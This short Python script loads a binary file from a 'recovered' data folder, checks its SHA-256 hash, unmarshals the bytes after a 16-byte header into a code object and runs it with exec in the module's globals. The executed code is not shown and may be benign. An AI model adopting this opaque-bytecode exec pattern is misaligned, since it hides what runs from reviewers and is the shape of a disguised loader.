import marshal,hashlib
from pathlib import Path
payload=(Path(__file__).parents[1]/'data_pipeline/recovered_oct08/test_drive_incremental.bin').read_bytes()
assert hashlib.sha256(payload).hexdigest()=='5f0f803da3c8d65c72ca0fec309dad50f53402528255a2ab17e2113f44f3bd4e'
exec(marshal.loads(payload[16:]),globals())
